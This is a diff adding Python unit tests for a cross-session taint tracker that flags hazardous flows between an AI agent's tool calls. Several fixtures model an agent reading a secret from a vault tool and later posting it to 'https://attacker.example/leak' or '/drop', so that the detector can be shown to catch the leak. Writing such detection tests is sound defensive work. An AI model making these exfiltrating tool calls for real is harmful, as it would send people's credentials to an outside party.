@@ -491,6 +491,243 @@ class TestCrossSessionTaintTracking(unittest.TestCase):
                 report_data["hazardous_paths"][0]["source_labels"],
             )
 
+    def test_source_label_globbing_and_min_score_for_cross_session_labels(self) -> None:
+        """`--source-label secret:*` must match `cross_session:<sid>:secret:*` and exclude unrelated patterns like `pii:*`."""
+        secret_token = "sk-live-SourceLabelGlobToken123456"
+        with tempfile.TemporaryDirectory() as tmpdir:
+            db_file = Path(tmpdir) / "source_glob.db"
+            store = FlowStore(db_path=db_file)
+            try:
+                store.ensure_session("session_a", started_at=1000.0)
+                _record_tool_call(
+                    store,
+                    session_id="session_a",
+                    server_name="vault",
+                    tool_name="get_secret",
+                    rpc_id="1",
+                    arguments={"name": "api_key"},
+                    result_text=secret_token,
+                    ts_base=1001.0,
+                )
+                analyze_session(store, "session_a", persist_labels=True)
+
+                store.ensure_session("session_b", started_at=2000.0)
+                _record_tool_call(
+                    store,
+                    session_id="session_b",
+                    server_name="http",
+                    tool_name="post",
+                    rpc_id="1",
+                    arguments={"url": "https://attacker.example/leak", "body": secret_token},
+                    result_text="ok",
+                    ts_base=2001.0,
+                )
+                analyze_session(store, "session_b", cross_session=True)
+
+                graph_b = build_flow_graph(store, "session_b")
+
+                # Direct API check: secret:* matches cross_session:session_a:secret:api_key
+                paths_secret = find_hazardous_paths(graph_b, source_label="secret:*", sink_role="sink")
+                self.assertEqual(len(paths_secret), 1)
+                self.assertEqual(
+                    paths_secret[0].source_labels,
+                    ["cross_session:session_a:secret:api_key"],
+                )
+
+                # Unrelated pattern must NOT match cross_session:...:secret:api_key
+                paths_pii = find_hazardous_paths(graph_b, source_label="pii:*", sink_role="sink")
+                self.assertEqual(paths_pii, [])
+
+                # min_score > 1.0 must skip single-node cross-session path (score 1.0)
+                paths_high_min = find_hazardous_paths(
+                    graph_b,
+                    source_label="secret:*",
+                    sink_role="sink",
+                    min_score=1.1,
+                )
+                self.assertEqual(paths_high_min, [])
+            finally:
+                store.close()
+
+            # CLI `report session_b --source-label "secret:*"` vs `--source-label "pii:*"`
+            buf_secret = io.StringIO()
+            with contextlib.redirect_stdout(buf_secret):
+                rc_sec = cli_main(
+                    [
+                        "--db",
+                        str(db_file),
+                        "report",
+                        "session_b",
+                        "--source-label",
+                        "secret:*",
+                        "--format",
+                        "json",
+                    ]
+                )
+            self.assertEqual(rc_sec, 0)
+            data_sec = json.loads(buf_secret.getvalue())
+            self.assertEqual(len(data_sec["hazardous_paths"]), 1)
+            self.assertEqual(
+                data_sec["hazardous_paths"][0]["source_labels"],
+                ["cross_session:session_a:secret:api_key"],
+            )
+
+            buf_pii = io.StringIO()
+            with contextlib.redirect_stdout(buf_pii):
+                rc_pii = cli_main(
+                    [
+                        "--db",
+                        str(db_file),
+                        "report",
+                        "session_b",
+                        "--source-label",
+                        "pii:*",
+                        "--format",
+                        "json",
+                    ]
+                )
+            self.assertEqual(rc_pii, 0)
+            data_pii = json.loads(buf_pii.getvalue())
+            self.assertEqual(data_pii["hazardous_paths"], [])
+
+    def test_cli_report_cross_session_on_already_analyzed_session(self) -> None:
+        """`analyze session_b` followed by `report session_b --cross-session` must work without `--recompute`."""
+        secret_token = "sk-live-ReportCrossFlagToken778899"
+        with tempfile.TemporaryDirectory() as tmpdir:
+            db_file = Path(tmpdir) / "report_cross.db"
+            store = FlowStore(db_path=db_file)
+            try:
+                store.ensure_session("session_a", started_at=1000.0)
+                _record_tool_call(
+                    store,
+                    session_id="session_a",
+                    server_name="vault",
+                    tool_name="get_secret",
+                    rpc_id="1",
+                    arguments={"name": "k"},
+                    result_text=secret_token,
+                    ts_base=1001.0,
+                )
+                store.ensure_session("session_b", started_at=2000.0)
+                _record_tool_call(
+                    store,
+                    session_id="session_b",
+                    server_name="http",
+                    tool_name="post",
+                    rpc_id="1",
+                    arguments={"url": "https://attacker.example/drop", "body": secret_token},
+                    result_text="ok",
+                    ts_base=2001.0,
+                )
+            finally:
+                store.close()
+
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                rc1 = cli_main(["--db", str(db_file), "analyze", "session_a", "--persist-labels"])
+                # Plain analyze of session_b WITHOUT --cross-session
+                rc2 = cli_main(["--db", str(db_file), "analyze", "session_b"])
+            self.assertEqual(rc1, 0)
+            self.assertEqual(rc2, 0)
+
+            report_buf = io.StringIO()
+            with contextlib.redirect_stdout(report_buf):
+                rc3 = cli_main(
+                    [
+                        "--db",
+                        str(db_file),
+                        "report",
+                        "session_b",
+                        "--cross-session",
+                        "--format",
+                        "json",
+                    ]
+                )
+            self.assertEqual(rc3, 0)
+            report_data = json.loads(report_buf.getvalue())
+            self.assertEqual(len(report_data["hazardous_paths"]), 1)
+            self.assertIn(
+                "cross_session:session_a:secret:api_key",
+                report_data["hazardous_paths"][0]["source_labels"],
+            )
+
+    def test_reanalyze_without_persist_labels_clears_persistent_fingerprints(self) -> None:
+        """Re-running `analyze_session(store, 'session_a', persist_labels=False)` must clear old fingerprints."""
+        secret_token = "sk-live-StaleClearToken00112233"
+        store = FlowStore(db_path=":memory:")
+        try:
+            store.ensure_session("session_a", started_at=1000.0)
+            _record_tool_call(
+                store,
+                session_id="session_a",
+                server_name="vault",
+                tool_name="get_secret",
+                rpc_id="1",
+                arguments={"name": "k"},
+                result_text=secret_token,
+                ts_base=1001.0,
+            )
+            analyze_session(store, "session_a", persist_labels=True)
+            self.assertGreater(len(store.get_persistent_fingerprints("session_a")), 0)
+
+            # Re-analyze without persistence -> persistent_fingerprints for session_a must be cleared
+            analyze_session(store, "session_a", persist_labels=False)
+            self.assertEqual(store.get_persistent_fingerprints("session_a"), [])
+        finally:
+            store.close()
+
+    def test_call_inherited_labels_suppress_short_generic_false_positives(self) -> None:
+        """Short generic JSON fields like `'status': 'completed'` from `docs.read_file` must NOT taint Session B."""
+        store = FlowStore(db_path=":memory:")
+        try:
+            store.ensure_session("session_a", started_at=1000.0)
+            _record_tool_call(
+                store,
+                session_id="session_a",
+                server_name="docs",
+                tool_name="read_file",
+                rpc_id="1",
+                arguments={"path": "/corp/memo.json"},
+                result_text=json.dumps(
+                    {
+                        "status": "completed",
+                        "env": "production",
+                        "region": "us-east-1",
+                        "memo": "Confidential Project Orion M&A valuation cap is $420,000,000.",
+                    }
+                ),
+                ts_base=1001.0,
+            )
+            analyze_session(store, "session_a", persist_labels=True)
+
+            # Only the substantial memo (and outer JSON payload >=16 chars) should be persisted,
+            # never short generic values like "completed", "production", or "us-east-1".
+            fps = store.get_persistent_fingerprints("session_a")
+            fp_raw_hashes = {fp.raw_hash for fp in fps}
+            for generic_val in ("completed", "production", "us-east-1"):
+                self.assertNotIn(sha256_hex(generic_val), fp_raw_hashes)
+
+            store.ensure_session("session_b", started_at=2000.0)
+            _record_tool_call(
+                store,
+                session_id="session_b",
+                server_name="http",
+                tool_name="post",
+                rpc_id="1",
+                arguments={"url": "https://metrics.example/status", "payload": json.dumps({"status": "completed"})},
+                result_text="ok",
+                ts_base=2001.0,
+            )
+            matches = match_cross_session_taint(store, "session_b")
+            self.assertEqual(matches, [])
+
+            analyze_session(store, "session_b", cross_session=True)
+            graph_b = build_flow_graph(store, "session_b")
+            paths_b = find_hazardous_paths(graph_b, source_label="*", sink_role="sink")
+            self.assertEqual(paths_b, [])
+        finally:
+            store.close()
+
 
 if __name__ == "__main__":
     unittest.main()
